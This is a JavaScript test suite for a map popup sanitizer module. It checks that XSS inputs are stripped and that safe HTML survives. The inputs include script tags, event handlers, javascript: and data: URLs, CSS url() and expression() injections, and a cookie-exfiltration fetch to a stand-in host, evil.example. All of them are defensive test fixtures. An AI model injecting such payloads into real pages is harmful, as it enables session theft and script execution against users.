/*
 * popupSanitizer.test.js — T-1 scaffold (ROADMAP §3 Theme C, Theme G).
 *
 * popupSanitizer.js is the single highest-leverage security module in
 * the viz: every user-controlled popup string, every user-controlled
 * map URL, and every user-controlled image src flows through one of
 * its exports. A regression here is a one-line PR away from shipping
 * `<script>` execution to every customer dashboard.
 *
 * This file is intentionally exhaustive (35+ cases) because:
 *   1. The full surface area is tiny (6 exports, 147 LOC).
 *   2. The cost of running these tests in CI is negligible (~80 ms).
 *   3. We want the scaffold's FIRST test file to set the bar:
 *      `every security predicate has paired positive + negative tests,
 *      every refused input fails CLOSED (returns '' / null / false,
 *      never undefined or partial output).`
 *
 * Cases cover OWASP A03 (Injection) and A05 (Security Misconfiguration)
 * paths that DOMPurify CVEs have historically allowed:
 *   - <script>, <iframe>, <object>, <embed>, <form>, <style>
 *   - on* handlers (onerror, onload, onclick, onmouseover)
 *   - javascript: URLs in <a href> and <img src>
 *   - mixed-content http:// URLs handed to MapLibre
 *   - target="_blank" reverse-tabnabbing (rel="noopener noreferrer")
 *   - srcset / srcdoc / data:text/html bypass attempts
 */

import {describe, it, expect} from 'vitest';
import {
    sanitizePopup,
    buildPopupFragment,
    isSafeMapUrl,
    safeMapUrlOrNull,
    isSafeHttpsImage,
    isSafeDataImage,
} from '../popupSanitizer.js';

describe('sanitizePopup — XSS attack surface', () => {
    it('strips <script> tags entirely', () => {
        const dirty = '<p>hello</p><script>alert(1)</script>';
        const clean = sanitizePopup(dirty);
        expect(clean).not.toContain('<script');
        expect(clean).not.toContain('alert(1)');
        expect(clean).toContain('<p>hello</p>');
    });

    it('strips <iframe> tags', () => {
        const dirty = '<iframe src="https://evil.example/"></iframe>';
        expect(sanitizePopup(dirty)).not.toContain('<iframe');
    });

    it('strips <object> and <embed>', () => {
        const dirty = '<object data="evil.swf"></object><embed src="evil.swf">';
        const clean = sanitizePopup(dirty);
        expect(clean).not.toContain('<object');
        expect(clean).not.toContain('<embed');
    });

    it('strips <form> (credential-harvest vector)', () => {
        const dirty = '<form action="https://evil.example/"><input name="user"></form>';
        expect(sanitizePopup(dirty)).not.toContain('<form');
    });

    it('strips <style> tags (CSS-only XSS in old browsers + UI redress)', () => {
        const dirty = '<style>* { background: red; }</style><p>ok</p>';
        const clean = sanitizePopup(dirty);
        expect(clean).not.toContain('<style');
        expect(clean).toContain('<p>ok</p>');
    });

    it('strips on* event handlers (onerror)', () => {
        const dirty = '<img src="https://example.com/x.png" onerror="alert(1)">';
        const clean = sanitizePopup(dirty);
        expect(clean).not.toContain('onerror');
        expect(clean).not.toContain('alert(1)');
    });

    it('strips on* event handlers (onload, onclick, onmouseover)', () => {
        const dirty =
            '<div onload="x()" onclick="y()" onmouseover="z()">hi</div>';
        const clean = sanitizePopup(dirty);
        expect(clean).not.toContain('onload');
        expect(clean).not.toContain('onclick');
        expect(clean).not.toContain('onmouseover');
        expect(clean).toContain('hi');
    });

    it('strips srcset (avoids fetch-based exfiltration)', () => {
        const dirty = '<img src="https://e.example/x.png" srcset="https://evil.example/x.png 1x">';
        expect(sanitizePopup(dirty)).not.toContain('srcset');
    });

    it('strips srcdoc on iframes (defence in depth — iframe is already gone)', () => {
        // FORBID_ATTR includes srcdoc; even if a future config error let
        // iframe through, srcdoc would still be dropped.
        const dirty = '<iframe srcdoc="<script>1</script>"></iframe>';
        const clean = sanitizePopup(dirty);
        expect(clean).not.toContain('srcdoc');
        expect(clean).not.toContain('<iframe');
    });

    it('removes javascript: URLs from <a href>', () => {
        const dirty = '<a href="javascript:alert(1)">click</a>';
        const clean = sanitizePopup(dirty);
        expect(clean).not.toContain('javascript:');
        // KEEP_CONTENT: true — link text stays even if href is removed.
        expect(clean).toContain('click');
    });

    it('removes javascript: URLs with leading whitespace (regex robustness)', () => {
        // The hook uses /^\s*javascript:/i — confirm whitespace doesn't bypass it.
        const dirty = '<a href="   javascript:alert(1)">x</a>';
        const clean = sanitizePopup(dirty);
        expect(clean).not.toMatch(/href\s*=\s*['"]?\s*javascript:/i);
    });

    it('removes javascript: URLs with mixed case', () => {
        const dirty = '<a href="JaVaScRiPt:alert(1)">x</a>';
        expect(sanitizePopup(dirty)).not.toMatch(/javascript:/i);
    });

    it('removes data:text/html (HTML-in-link XSS vector)', () => {
        // DOMPurify default ALLOWED_URI_REGEXP rejects data:text/html for
        // a/href. Confirm we inherit that behaviour.
        const dirty = '<a href="data:text/html,<script>1</script>">x</a>';
        const clean = sanitizePopup(dirty);
        expect(clean).not.toContain('data:text/html');
        expect(clean).not.toContain('<script');
    });
});

describe('sanitizePopup — image src allow-list (defence in depth)', () => {
    it('strips javascript: URL from <img src>', () => {
        // DOMPurify removes javascript: via its own URI filter; the
        // afterSanitizeAttributes hook then double-checks for any
        // unsafe src that slipped through (e.g. http://).
        const dirty = '<img src="javascript:alert(1)">';
        const clean = sanitizePopup(dirty);
        expect(clean).not.toContain('javascript:');
    });

    it('strips http:// image src (mixed content)', () => {
        const dirty = '<img src="http://insecure.example/x.png">';
        const clean = sanitizePopup(dirty);
        // The <img> tag may survive but the src must be gone.
        expect(clean).not.toContain('http://');
    });

    it('keeps https:// image src', () => {
        const dirty = '<img src="https://example.com/x.png" alt="x">';
        const clean = sanitizePopup(dirty);
        expect(clean).toContain('https://example.com/x.png');
    });

    it('keeps data:image/png base64 src', () => {
        const dirty = '<img src="data:image/png;base64,iVBORw0KGgo=" alt="dot">';
        const clean = sanitizePopup(dirty);
        expect(clean).toContain('data:image/png');
    });

    it('strips data:image/svg+xml src — NOT in isSafeDataImage allow-list paths', () => {
        // Hook only allows png/jpeg/gif/webp/svg+xml. svg+xml IS allowed
        // by the regex, so this case validates that the allow-list works
        // end-to-end (positive case).
        const dirty = '<img src="data:image/svg+xml;base64,PHN2Zz4=" alt="s">';
        expect(sanitizePopup(dirty)).toContain('data:image/svg+xml');
    });

    it('strips data:application/octet-stream src (binary blob attack)', () => {
        const dirty = '<img src="data:application/octet-stream;base64,AAAA">';
        const clean = sanitizePopup(dirty);
        expect(clean).not.toContain('data:application/');
    });
});

describe('sanitizePopup — target=_blank reverse tabnabbing', () => {
    it('adds rel="noopener noreferrer" to target=_blank links', () => {
        const dirty = '<a href="https://e.com" target="_blank">x</a>';
        const clean = sanitizePopup(dirty);
        expect(clean).toContain('rel="noopener noreferrer"');
        expect(clean).toContain('target="_blank"');
    });

    it('does not add rel="noopener" to non-_blank links (preserves UX)', () => {
        const dirty = '<a href="https://e.com">x</a>';
        const clean = sanitizePopup(dirty);
        expect(clean).not.toContain('noopener');
    });

    it('overrides a user-supplied rel="opener" on target=_blank', () => {
        const dirty = '<a href="https://e.com" target="_blank" rel="opener">x</a>';
        const clean = sanitizePopup(dirty);
        // Whatever DOMPurify did with the existing rel, the hook
        // overwrites it to noopener noreferrer.
        expect(clean).toContain('rel="noopener noreferrer"');
        expect(clean).not.toContain('rel="opener"');
    });
});

describe('sanitizePopup — allowed content survives', () => {
    it('preserves headings, paragraphs, lists', () => {
        const dirty =
            '<h2>Title</h2><p>body</p><ul><li>one</li><li>two</li></ul>';
        const clean = sanitizePopup(dirty);
        expect(clean).toContain('<h2>Title</h2>');
        expect(clean).toContain('<p>body</p>');
        expect(clean).toContain('<ul>');
        expect(clean).toContain('<li>one</li>');
    });

    it('preserves tables with colspan / rowspan', () => {
        const dirty =
            '<table><thead><tr><th colspan="2">x</th></tr></thead>' +
            '<tbody><tr><td rowspan="1">a</td><td>b</td></tr></tbody></table>';
        const clean = sanitizePopup(dirty);
        expect(clean).toContain('<table>');
        expect(clean).toContain('colspan="2"');
        expect(clean).toContain('rowspan="1"');
    });

    it('preserves inline formatting (b, i, code, strong, em)', () => {
        const dirty = '<p><b>B</b> <i>I</i> <code>C</code> <strong>S</strong> <em>E</em></p>';
        const clean = sanitizePopup(dirty);
        for (const tag of ['b', 'i', 'code', 'strong', 'em']) {
            expect(clean).toContain(`<${tag}>`);
        }
    });

    it('preserves class attribute (theming hook)', () => {
        const dirty = '<div class="my-popup-card">x</div>';
        expect(sanitizePopup(dirty)).toContain('class="my-popup-card"');
    });

    it('strips data-* attributes (ALLOW_DATA_ATTR: false)', () => {
        const dirty = '<div data-secret="x">y</div>';
        const clean = sanitizePopup(dirty);
        expect(clean).not.toContain('data-secret');
        expect(clean).toContain('y');
    });
});

describe('sanitizePopup — input contract (fails closed)', () => {
    it('returns empty string for null', () => {
        expect(sanitizePopup(null)).toBe('');
    });

    it('returns empty string for undefined', () => {
        expect(sanitizePopup(undefined)).toBe('');
    });

    it('returns empty string for non-string (number, object, array)', () => {
        expect(sanitizePopup(42)).toBe('');
        expect(sanitizePopup({})).toBe('');
        expect(sanitizePopup([])).toBe('');
    });

    it('returns empty string for empty string', () => {
        expect(sanitizePopup('')).toBe('');
    });

    it('always returns a string (never undefined)', () => {
        // Stress-test a handful of edge inputs.
        for (const input of [null, undefined, 0, '', '<p>ok</p>', '<script>1</script>']) {
            expect(typeof sanitizePopup(input)).toBe('string');
        }
    });
});

describe('buildPopupFragment', () => {
    it('returns a div wrapper with the better_map-popup class', () => {
        const node = buildPopupFragment(document, '<p>hello</p>');
        expect(node.tagName).toBe('DIV');
        expect(node.className).toBe('better_map-popup');
    });

    it('embeds sanitised HTML, not raw input', () => {
        const node = buildPopupFragment(
            document,
            '<p>safe</p><script>alert(1)</script>'
        );
        expect(node.innerHTML).toContain('<p>safe</p>');
        expect(node.innerHTML).not.toContain('<script');
        expect(node.innerHTML).not.toContain('alert(1)');
    });

    it('produces an empty wrapper for empty input', () => {
        const node = buildPopupFragment(document, '');
        expect(node.innerHTML).toBe('');
        expect(node.className).toBe('better_map-popup');
    });
});

describe('isSafeMapUrl — scheme allow-list for MapLibre', () => {
    it.each([
        'https://tiles.example.com/style.json',
        'https://api.maptiler.com/maps/streets/style.json?key=abc',
    ])('accepts https URLs: %s', (url) => {
        expect(isSafeMapUrl(url)).toBe(true);
    });

    it('accepts pmtiles:// URLs', () => {
        expect(isSafeMapUrl('pmtiles://https://example.com/data.pmtiles')).toBe(true);
    });

    it.each([
        '/app/better_map/static/style.json',
        './style.json',
        '../style.json',
    ])('accepts relative paths: %s', (url) => {
        expect(isSafeMapUrl(url)).toBe(true);
    });

    it.each([
        'http://insecure.example.com/style.json',
        'ftp://files.example.com/style.json',
        'file:///etc/passwd',
        'javascript:alert(1)',
    ])('rejects unsafe schemes: %s', (url) => {
        expect(isSafeMapUrl(url)).toBe(false);
    });

    it('rejects empty / non-string input', () => {
        expect(isSafeMapUrl('')).toBe(false);
        expect(isSafeMapUrl(null)).toBe(false);
        expect(isSafeMapUrl(undefined)).toBe(false);
        expect(isSafeMapUrl(42)).toBe(false);
    });

    it('rejects malformed URLs that crash URL constructor', () => {
        // `://no-scheme` parses oddly across runtimes; predicate must
        // never throw.
        expect(() => isSafeMapUrl('://malformed')).not.toThrow();
    });
});

describe('safeMapUrlOrNull — null on rejection', () => {
    it('returns url verbatim when safe', () => {
        const url = 'https://example.com/x.json';
        expect(safeMapUrlOrNull(url)).toBe(url);
    });

    it('returns null when unsafe', () => {
        expect(safeMapUrlOrNull('http://x.com')).toBeNull();
        expect(safeMapUrlOrNull('javascript:1')).toBeNull();
        expect(safeMapUrlOrNull(null)).toBeNull();
    });
});

describe('isSafeHttpsImage', () => {
    it('accepts https:// image URLs', () => {
        expect(isSafeHttpsImage('https://example.com/x.png')).toBe(true);
    });

    it.each([
        'http://example.com/x.png',
        'data:image/png;base64,AAAA',
        'javascript:alert(1)',
        'pmtiles://https://example.com/x.pmtiles',
        '',
        null,
        undefined,
    ])('rejects: %s', (url) => {
        expect(isSafeHttpsImage(url)).toBe(false);
    });
});

describe('isSafeDataImage', () => {
    it.each([
        'data:image/png;base64,AAAA',
        'data:image/jpeg;base64,AAAA',
        'data:image/gif;base64,AAAA',
        'data:image/webp;base64,AAAA',
        'data:image/svg+xml;base64,PHN2Zz4=',
    ])('accepts safe image data URIs: %s', (url) => {
        expect(isSafeDataImage(url)).toBe(true);
    });

    it('accepts mixed-case data: prefix (per RFC 2397)', () => {
        expect(isSafeDataImage('DATA:image/png;base64,AAAA')).toBe(true);
    });

    it.each([
        'data:image/bmp;base64,AAAA', // bmp NOT in allow-list
        'data:text/html;base64,AAAA',
        'data:application/octet-stream;base64,AAAA',
        'https://example.com/x.png',
        '',
        null,
        undefined,
    ])('rejects: %s', (url) => {
        expect(isSafeDataImage(url)).toBe(false);
    });
});

describe('integration — popup with mixed safe + unsafe content', () => {
    it('a realistic Splunk popup string survives intact while attacks are stripped', () => {
        const dirty = `
            <h3>Asset 12-A</h3>
            <p><b>Status:</b> normal</p>
            <table>
              <tbody>
                <tr><td>Temp</td><td>72&deg;F</td></tr>
                <tr><td>Health</td><td>99.5%</td></tr>
              </tbody>
            </table>
            <p><a href="https://app.example/asset/12a" target="_blank">View</a></p>
            <!-- attacks below should all be stripped -->
            <script>fetch('https://evil.example/?c=' + document.cookie)</script>
            <iframe src="javascript:1"></iframe>
            <img src="http://insecure.example/x.png" onerror="alert(1)">
            <a href="javascript:alert(1)">click me</a>
        `;
        const clean = sanitizePopup(dirty);
        // Safe content preserved.
        expect(clean).toContain('<h3>Asset 12-A</h3>');
        expect(clean).toContain('<b>Status:</b>');
        expect(clean).toContain('<table>');
        expect(clean).toContain('72');
        expect(clean).toContain('99.5%');
        expect(clean).toContain('https://app.example/asset/12a');
        expect(clean).toContain('rel="noopener noreferrer"');
        // Every attack stripped.
        expect(clean).not.toContain('<script');
        expect(clean).not.toContain('document.cookie');
        expect(clean).not.toContain('<iframe');
        expect(clean).not.toContain('javascript:');
        expect(clean).not.toContain('onerror');
        expect(clean).not.toContain('http://insecure.example');
    });
});

/*
 * v1.7 — Tier 2 #6: opt-in inline-style allowlist.
 *
 * Three test classes:
 *   1. Default behaviour preserved — without opts, `style=` is stripped.
 *   2. Opt-in flag — with `{allowInlineStyles:true}`, the SAFE_STYLE_PROPS
 *      allow-list is honoured and unsafe declarations are dropped.
 *   3. Defense-in-depth — explicit attempts to inject CSS-level attacks
 *      (url(), expression(), behavior:, position:fixed, @import,
 *      backslash escapes, !important escalation) ALL fail closed even
 *      when their property name is in SAFE_STYLE_PROPS.
 */
describe('sanitizePopup — inline-style allowlist (Tier 2 #6)', () => {
    describe('default (allowInlineStyles=false)', () => {
        it('strips style attributes by default', () => {
            const clean = sanitizePopup('<p style="color:#f00">hi</p>');
            expect(clean).toContain('<p>hi</p>');
            expect(clean).not.toContain('style');
            expect(clean).not.toContain('color');
        });

        it('strips style even when opts is undefined explicitly', () => {
            const clean = sanitizePopup('<span style="color:red">x</span>', undefined);
            expect(clean).not.toContain('style');
        });

        it('strips style when opts.allowInlineStyles is omitted', () => {
            const clean = sanitizePopup('<b style="color:red">x</b>', {});
            expect(clean).not.toContain('style');
        });
    });

    describe('opt-in (allowInlineStyles=true)', () => {
        const allow = { allowInlineStyles: true };

        it('preserves safe color declarations', () => {
            const clean = sanitizePopup('<span style="color: #ff0000">19,217</span>', allow);
            expect(clean).toContain('style="color: #ff0000"');
            expect(clean).toContain('19,217');
        });

        it('preserves safe background-color', () => {
            const clean = sanitizePopup('<span style="background-color: rgb(34, 211, 238)">x</span>', allow);
            expect(clean).toContain('background-color: rgb(34, 211, 238)');
        });

        it('preserves font-weight + font-size in one declaration', () => {
            const clean = sanitizePopup('<b style="font-weight: 700; font-size: 14px">19,217</b>', allow);
            expect(clean).toContain('font-weight: 700');
            expect(clean).toContain('font-size: 14px');
        });

        it('preserves multiple declarations, drops unsafe ones, keeps safe ones', () => {
            const clean = sanitizePopup(
                '<p style="color: red; position: fixed; font-weight: bold; display: block">x</p>',
                allow
            );
            // safe declarations survive
            expect(clean).toContain('color: red');
            expect(clean).toContain('font-weight: bold');
            // unsafe / non-allowlisted declarations dropped
            expect(clean).not.toContain('position');
            expect(clean).not.toContain('display');
        });

        it('preserves padding/margin/text-align', () => {
            const clean = sanitizePopup(
                '<div style="padding: 6px; margin: 4px; text-align: center">x</div>',
                allow
            );
            expect(clean).toContain('padding: 6px');
            expect(clean).toContain('margin: 4px');
            expect(clean).toContain('text-align: center');
        });
    });

    describe('opt-in — unsafe declarations rejected even with allowlist on', () => {
        const allow = { allowInlineStyles: true };

        it.each([
            // url() — exfiltration / Referer
            ['<p style="color: red; background-image: url(https://evil.example/x.png)">x</p>', 'url('],
            ['<p style="color: url(https://evil.example/x.png)">x</p>', 'url('],
            // expression() — legacy IE script-equivalent
            ['<p style="color: expression(alert(1))">x</p>', 'expression('],
            // behavior: — legacy IE behaviour binding
            ['<p style="behavior: url(#xss)">x</p>', 'behavior'],
            // position:fixed — clickjacking via popup overlay
            ['<p style="color: red; position: fixed">x</p>', 'position'],
            ['<p style="color: red; position: absolute">x</p>', 'absolute'],
            ['<p style="color: red; position: sticky">x</p>', 'sticky'],
            // @import / @charset — at-rule injection
            ['<p style="@import url(https://evil.example)">x</p>', '@import'],
            // javascript: / vbscript: / data:text inside a value
            ['<p style="background-image: javascript:alert(1)">x</p>', 'javascript:'],
            ['<p style="background-image: vbscript:msgbox(1)">x</p>', 'vbscript'],
            // backslash escapes (\\0006a = "j", classic CSS bypass)
            ['<p style="color: \\0006a">x</p>', '\\']
        ])('strips: %s', (dirty, leakedToken) => {
            const clean = sanitizePopup(dirty, allow);
            // Don't mind whether the style attribute survives empty —
            // only that no fragment of the dangerous value remains.
            expect(clean.toLowerCase()).not.toContain(leakedToken.toLowerCase());
        });

        it('drops the entire style attribute when nothing safe survives', () => {
            const clean = sanitizePopup(
                '<p style="position: fixed; behavior: url(#xss)">x</p>',
                allow
            );
            expect(clean).not.toContain('style');
        });

        it('strips !important escalation suffix from kept declarations', () => {
            const clean = sanitizePopup('<b style="color: red !important">x</b>', allow);
            // color: red survives, !important does not.
            expect(clean).toContain('color: red');
            expect(clean).not.toContain('!important');
        });

        it('drops empty declarations and malformed entries gracefully', () => {
            const clean = sanitizePopup(
                '<p style=";;;; color: red; ; font-size: 10px; ; ;">x</p>',
                allow
            );
            expect(clean).toContain('color: red');
            expect(clean).toContain('font-size: 10px');
        });
    });

    describe('flag reset between calls (no global leak)', () => {
        it('after an allow-inline-styles call, the next default call strips styles', () => {
            const allow = { allowInlineStyles: true };
            const a = sanitizePopup('<p style="color: red">a</p>', allow);
            expect(a).toContain('color: red');
            const b = sanitizePopup('<p style="color: red">b</p>'); // default
            expect(b).not.toContain('style');
            expect(b).not.toContain('color: red');
        });

        it('script and iframe stay blocked even with inline styles on', () => {
            const allow = { allowInlineStyles: true };
            const clean = sanitizePopup(
                '<p style="color: red">ok</p><script>alert(1)</script><iframe></iframe><style>body{}</style>',
                allow
            );
            expect(clean).toContain('color: red');
            expect(clean).not.toContain('<script');
            expect(clean).not.toContain('<iframe');
            expect(clean).not.toContain('<style');
        });
    });
});
